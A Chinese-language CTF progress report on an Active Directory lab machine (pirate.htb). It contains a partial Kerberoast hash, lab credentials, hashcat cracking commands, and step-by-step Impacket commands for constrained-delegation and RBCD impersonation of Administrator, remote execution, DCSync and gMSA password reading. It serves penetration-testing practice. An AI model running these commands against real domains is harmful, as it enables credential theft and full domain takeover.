# CTF 渗透进度报告 — 10.129.8.87 (pirate.htb)

**日期**：2026-03-03  
**题目类型**：Windows Active Directory CTF  

---

## 目标信息

| 项目 | 内容 |
|------|------|
| IP | 10.129.8.87 |
| 域名 | pirate.htb |
| 机器名 | DC01.pirate.htb |
| 操作系统 | Windows Server 2019 Standard (Build 17763) |
| 初始凭据 | `pentest / p3nt3st2025!&` |

---

## 开放端口

| 端口 | 服务 | 备注 |
|------|------|------|
| 80 | IIS 10.0 | 默认页面 |
| 443 | HTTPS | |
| 88 | Kerberos | |
| 135 | RPC/WMI | |
| 139/445 | SMB | |
| 389 | LDAP | |
| 636 | LDAPS | |
| 3268/3269 | Global Catalog | |
| 5985 | WinRM | 响应 404 |
| 9389 | ADWS | |

---

## 域内用户（7个）

| 用户 | 备注 |
|------|------|
| Administrator | 域管理员 |
| krbtgt | 系统账户 |
| Guest | 禁用 |
| **a.white_adm** | ⭐ SPN=`ADFS/a.white`，约束委派，IT 组成员 |
| a.white | 普通用户 |
| j.sparrow | 普通用户 |
| pentest | 当前掌握账户 |

---

## 域内计算机（5台）

| 机器名 | DNS | 备注 |
|--------|-----|------|
| DC01 | DC01.pirate.htb | 域控制器 |
| WEB01 | WEB01.pirate.htb | **约束委派目标** |
| MS01 | — | Domain Secure Servers 成员 |
| EXCH01 | — | Exchange 相关 |
| gMSA_ADFS_prod$ | adfs.pirate.htb | gMSA，Remote Management Users 组 |
| gMSA_ADCS_prod$ | adcs.pirate.htb | gMSA，Remote Management Users 组 |

---

## 关键发现：a.white_adm 约束委派

```
SPN:                 ADFS/a.white
AllowedToDelegateTo: http/WEB01.pirate.htb
                     HTTP/WEB01
成员组:              CN=IT,CN=Users,DC=pirate,DC=htb
```

> **攻击意义**：获得 a.white_adm 凭据后，可通过 S4U2Proxy 以任意用户（包括 Administrator）身份访问 WEB01 的 HTTP 服务。

---

## 已获取的 Kerberoast 哈希

文件位置：`d:\mcp\redteam-server\kerb_hashes.txt`

```
$krb5tgs$23$*a.white_adm$PIRATE.HTB$pirate.htb/a.white_adm*$48a07d95d905539
4adf46e24b5ac266b$2cac476361db4e9418a300780268669...（省略）...98b8ff
```

### 破解状态

| 字典/规则 | 候选数量 | 结果 |
|-----------|----------|------|
| 弱口令字典 2W 条 | ~24,908 | ❌ 未命中 |
| rockyou.txt + best64 | ~11 亿 | ❌ 未命中 |
| pirate 主题自定义 + d3ad0ne | ~62×规则 | ❌ 未命中 |

---

## 攻击链（解题思路）

```
pentest（已有凭据）
    │
    └─► Kerberoasting
            │  请求 a.white_adm 的 TGS 哈希（已完成）
            ▼
        hashcat 破解 TGS 哈希
            │  获得 a.white_adm 明文密码
            ▼
        约束委派攻击 (S4U2Proxy)
            │  getST.py -impersonate Administrator -spn http/WEB01
            ▼
        Administrator@WEB01 Kerberos 票据
            │
            ├─► wmiexec / evil-winrm 登录 WEB01
            │       └─► user.txt
            │
            └─► secretsdump / DCSync
                    └─► Administrator NTLM Hash
                            └─► wmiexec DC01
                                    └─► root.txt
```

---

## 下一步操作

### Step 1：继续破解 TGS 哈希

```powershell
cd D:\mcp\hashcat-6.2.6

# 方案A：rockyou + d3ad0ne 规则（约3.8亿候选，~90秒）
.\hashcat.exe -m 13100 d:\mcp\redteam-server\kerb_hashes.txt .\rockyou.txt `
  -r .\rules\d3ad0ne.rule --force -O -d 1

# 方案B：rockyou + T0XlC 规则（带特殊字符变形）
.\hashcat.exe -m 13100 d:\mcp\redteam-server\kerb_hashes.txt .\rockyou.txt `
  -r .\rules\T0XlC.rule --force -O -d 1

# 方案C：掩码攻击 首字母大写+小写*4+数字*2+特殊符号
.\hashcat.exe -m 13100 d:\mcp\redteam-server\kerb_hashes.txt `
  -a 3 ?u?l?l?l?l?l?d?d?s --force -O -d 1

# 方案D：rockyou + rockyou-30000 规则（最强，耗时较长）
.\hashcat.exe -m 13100 d:\mcp\redteam-server\kerb_hashes.txt .\rockyou.txt `
  -r .\rules\rockyou-30000.rule --force -O -d 1
```

### Step 2：破解成功后 → 约束委派提权

```bash
# 用 a.white_adm 伪造 Administrator 访问 WEB01 的票据
python GetUserSPNs.py "pirate.htb/a.white_adm:<密码>" -dc-ip 10.129.8.87

python getST.py "pirate.htb/a.white_adm:<密码>" \
  -spn "http/WEB01.pirate.htb" \
  -impersonate Administrator \
  -dc-ip 10.129.8.87

# 设置票据环境变量并登录 WEB01
set KRB5CCNAME=Administrator@http_WEB01.pirate.htb@PIRATE.HTB.ccache
python wmiexec.py -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb

# 读取 flag
type C:\Users\Administrator\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

### Step 3：若哈希无法破解 → 备用路径

```bash
# 检查 pentest 是否可读取 gMSA 托管密码
python getManagedPassword.py "pirate.htb/pentest:p3nt3st2025!&" \
  -dc-ip 10.129.8.87 gMSA_ADFS_prod$

# 检查 WEB01 是否开放 Web 服务，寻找 CVE 漏洞
nxc http 10.129.8.87 --no-bruteforce
ffuf -u http://WEB01.pirate.htb/FUZZ -w wordlist.txt

# 尝试 RBCD (Resource-Based Constrained Delegation) 攻击
python rbcd.py -delegate-from pentest -delegate-to WEB01$ \
  "pirate.htb/pentest:p3nt3st2025!&" -dc-ip 10.129.8.87
```

---

## 工具与脚本位置

| 文件 | 说明 |
|------|------|
| `d:\mcp\redteam-server\kerb_hashes.txt` | a.white_adm TGS 哈希 |
| `d:\mcp\redteam-server\pirate_custom.txt` | 自定义 pirate 主题字典 |
| `d:\mcp\hashcat-6.2.6\rockyou.txt` | rockyou 字典 |
| `C:\Users\90898\Desktop\弱口令字典（2W+条，无重复）.txt` | 中文弱口令字典 |
| `C:\Users\90898\.pyenv\...\Scripts\GetUserSPNs.py` | Kerberoasting |
| `C:\Users\90898\.pyenv\...\Scripts\getST.py` | 约束委派票据伪造 |
| `C:\Users\90898\.pyenv\...\Scripts\wmiexec.py` | 远程命令执行 |
| `C:\Users\90898\.pyenv\...\Scripts\secretsdump.py` | 凭据转储 / DCSync |
